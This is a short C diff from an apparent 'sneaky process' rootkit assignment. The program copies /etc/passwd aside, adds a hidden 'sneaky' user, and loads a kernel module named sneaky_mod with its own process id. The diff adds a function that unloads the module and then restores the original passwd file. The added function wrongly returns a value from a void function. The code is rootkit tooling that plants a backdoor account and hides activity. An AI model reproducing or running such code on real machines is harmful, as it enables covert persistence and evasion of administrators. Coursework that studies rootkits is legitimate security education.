@@ -53,12 +53,20 @@ void loadSneakyModule(int pid){
   close(fd);
 } 
 
+
+void unLoadingSneakyModule(){
+  int res = syscall(__NR_delete_module, "sneaky_mod", O_NONBLOCK);
+  if(res != 0){
+    printf("Sneaky Module did not unload successfully\n");
+    return EXIT_FAILURE;
+  }
+  printf("Sneaky Module is unloaded successfully\n");
+}
+
 int main(int argc, char* argv[]){
   int current_pid = getpid();
   printf("sneaky_process pid = %d\n", current_pid);
-  printf("Copying file\n");
   copyfile("/etc/passwd", "/tmp/passwd");
-  printf("Adding sneaky user\n");
   addSneakyUser();
   printf("Loading Sneaky user\n");
   loadSneakyModule(current_pid);
@@ -70,6 +78,7 @@ int main(int argc, char* argv[]){
     }
   }
 
+  unLoadingSneakyModule();
   copyfile("/tmp/passwd", "/etc/passwd");
     
   return 0;
